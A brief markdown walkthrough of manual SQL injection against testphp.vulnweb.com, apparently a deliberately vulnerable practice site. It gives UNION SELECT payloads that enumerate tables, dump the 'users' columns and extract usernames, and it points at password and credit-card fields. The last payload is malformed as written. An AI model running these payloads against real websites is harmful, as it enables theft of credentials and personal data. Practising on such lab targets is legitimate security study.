# Website Database Hacking Without Using Any Tool

### Step_1

- `go to link` `http://testphp.vulnweb.com/`

  - menu: `artists`
    - hit first link: `r4w8173`
    - you can see this link `testphp.vulnweb.com/artists.php?artist=1`

- add ` ` `
  - http://testphp.vulnweb.com/artists.php?artist=1`
  - we can see `Warning. mysql_fetch_arrar() ....` like this.

### Find Column

- testphp.vulnweb.com/artists.php?artist=1 `order by 5--`
  - we can't find any
  - u can change 5 or 4 or 3
    - we got 3
      - then you see `artist: r4w8173`
        - it does mean we have 3 columns

### Find Table name

- testphp.vulnweb.com/artists.php?artist=1 `union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--`

- we cannot find table

  - then we can add **-1** or **-1`** or **-1-**

    - testphp.vulnweb.com/artists.php?artist=`-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--`

  - we found `8 tables`
    - `artists,carts,categ,featured,guestbook,pictures,products,users`

### find out column name

- `users`

  - `testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users"--`

- then you can see column name

  - `uname,pass,cc,address,email,name,phone,cart`

- You want to check unmae

  - `testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(uname) from users--`

  - then u can see username `test`

- You also can subtitute column name `uname,pass,cc,address,email,name,phone,cart`
  - testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,group_concat(`pass`or`cc`or`address`or`email`) from users--
